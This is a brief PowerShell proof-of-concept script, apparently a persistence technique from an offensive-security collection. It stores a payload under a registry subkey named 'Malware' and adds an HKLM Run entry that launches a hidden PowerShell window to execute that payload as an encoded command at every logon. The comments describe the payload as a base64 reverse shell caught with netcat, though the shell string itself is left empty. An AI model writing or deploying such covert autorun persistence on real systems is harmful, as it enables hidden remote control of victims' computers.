<#

This POC is only for educational purpose

In this POC we create a subkey under the HKLM hive called Malware. Under this subkey we store the base64 reverse shell

Next we under run key we add additional entry which is execution of base64 payload stored under Malware subkey.

Make sure that netcat is listening on correct port number

#>


$payload = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -W hidden -noexit -command powershell.exe -W Hidden -noexit  -enc (Get-ItemProperty -Path HKLM:\\SOFTWARE\Microsoft\Windows\CurrentVersion\Malware\ -Name Shell | Select-Object -ExpandProperty Shell)"
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name ExecuteMalware -PropertyType String -Value $payload -Force

$shell = ""
New-Item -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Malware
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Malware -Name Shell -PropertyType String -Value $shell -Force
